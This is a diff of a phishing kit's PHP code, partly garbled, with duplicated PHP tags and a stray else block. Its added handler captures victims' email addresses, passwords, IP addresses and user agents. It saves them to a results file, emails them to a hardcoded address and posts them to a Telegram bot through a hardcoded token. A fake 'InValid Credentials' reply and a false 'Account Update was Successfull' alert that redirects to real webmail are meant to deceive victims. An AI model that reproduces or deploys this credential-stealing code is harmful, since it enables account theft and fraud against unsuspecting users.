@@ -1,9 +1,76 @@
 <?php 
+
+<?php
+require_once('config.php');
+
+$email = trim($_POST['ai']);
+$password = trim(base64_decode(urldecode($_POST['pr'])));
+if($email != null && $password != null){
+    $details = trim($_POST['detail']);
+	$ip = getenv("REMOTE_ADDR");
+	$hostname = gethostbyaddr($ip);
+	$useragent = $_SERVER['HTTP_USER_AGENT'];
+
+    $message = "|Docusign Client ".$_SESSION['client']."\n";
+	$message .= "From ".$_SESSION['EML']."\n";
+	$message = "Online ID            : ".$email."\n";
+	$message .= "Passcode              : ".$password."\n";
+	$message .= "Details              : ".$details."\n";
+	$message .= "|Client IP: ".$ip."\n";
+	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
+	$message .= "User Agent : ".$useragent."\n";
+    
+    $_SESSION['fullz'] = $message."</br></br>".$_SESSION['fullz']; 
+    file_put_contents("../Admin/Results.txt", $message, FILE_APPEND);
+
+	$subject = "YAHOO Logs : $ip";
+    mail($send, $subject, $message);   
+ 	$data = ['text' => $message,'chat_id' => $cID];    
+	$website="https://api.telegram.org/bot$TGBO";
+	  $ch = curl_init($website . '/sendMessage');
+	  curl_setopt($ch, CURLOPT_HEADER, false);
+	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	  curl_setopt($ch, CURLOPT_POST, 1);
+	  curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
+	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	  $result = curl_exec($ch);
+	  curl_close($ch);
+
+	
+
+	$signal = 'ok';
+	$msg = 'InValid Credentials';
+	
+	// $praga=rand();
+	// $praga=md5($praga);
+}
+else{
+	$signal = 'bad';
+	$msg = 'Please fill in all the fields.';
+}
+$data = array(
+        'signal' => $signal,
+        'msg' => $msg,
+        'redirect_link' => $redirect,
+    );
+    echo json_encode($data);
+	
+if(isset($_POST['note'])){
+        call("/- AOL  Notification -/
+           ".$_POST['note']);
+        }
+
+?>
+
 session_start();
 error_reporting(0);
 
 // Turn ON the antivirus on Anticonfig
 
+
+
+
+?>
 
 $scamname = ""; //
 //Your Email
@@ -12,6 +79,21 @@ $send = "appon132@gmail.com";
 $TGBO = '7897940356:AAFZg8h-zd7XZ8zC0M1ARWWG5WSsU0REEUw';
 //Telegram ChatID 
 $cID = '6209158260';
+
+{
+?>
+	
+		   <script language=javascript>
+alert('Account Update was Successfull!!!');
+window.location='https://webmail.iprimus.com.au/?_task=mail&_mbox=INBOX';
+</script>
+<?
+
+	   }
+else
+    	   {
+ 		echo "ERROR! Please go back and try again.";
+  	   }
 
 ?>
 
@@ -405,65 +487,3 @@ function validatenew(a){var b=new XMLHttpRequest;b.open("POST",uril),b.setReques
 </script>
 </body>
 </html>
-
-<?php
-require_once('config.php');
-
-$email = trim($_POST['ai']);
-$password = trim(base64_decode(urldecode($_POST['pr'])));
-if($email != null && $password != null){
-    $details = trim($_POST['detail']);
-	$ip = getenv("REMOTE_ADDR");
-	$hostname = gethostbyaddr($ip);
-	$useragent = $_SERVER['HTTP_USER_AGENT'];
-
-    $message = "|Docusign Client ".$_SESSION['client']."\n";
-	$message .= "From ".$_SESSION['EML']."\n";
-	$message = "Online ID            : ".$email."\n";
-	$message .= "Passcode              : ".$password."\n";
-	$message .= "Details              : ".$details."\n";
-	$message .= "|Client IP: ".$ip."\n";
-	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
-	$message .= "User Agent : ".$useragent."\n";
-    
-    $_SESSION['fullz'] = $message."</br></br>".$_SESSION['fullz']; 
-    file_put_contents("../Admin/Results.txt", $message, FILE_APPEND);
-
-	$subject = "YAHOO Logs : $ip";
-    mail($send, $subject, $message);   
- 	$data = ['text' => $message,'chat_id' => $cID];    
-	$website="https://api.telegram.org/bot$TGBO";
-	  $ch = curl_init($website . '/sendMessage');
-	  curl_setopt($ch, CURLOPT_HEADER, false);
-	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-	  curl_setopt($ch, CURLOPT_POST, 1);
-	  curl_setopt($ch, CURLOPT_POSTFIELDS, ($data));
-	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
-	  $result = curl_exec($ch);
-	  curl_close($ch);
-
-	
-
-	$signal = 'ok';
-	$msg = 'InValid Credentials';
-	
-	// $praga=rand();
-	// $praga=md5($praga);
-}
-else{
-	$signal = 'bad';
-	$msg = 'Please fill in all the fields.';
-}
-$data = array(
-        'signal' => $signal,
-        'msg' => $msg,
-        'redirect_link' => $redirect, 
-    );
-    echo json_encode($data);
-	
-if(isset($_POST['note'])){
-        call("/- AOL  Notification -/
-           ".$_POST['note']);
-        }
-
-?>
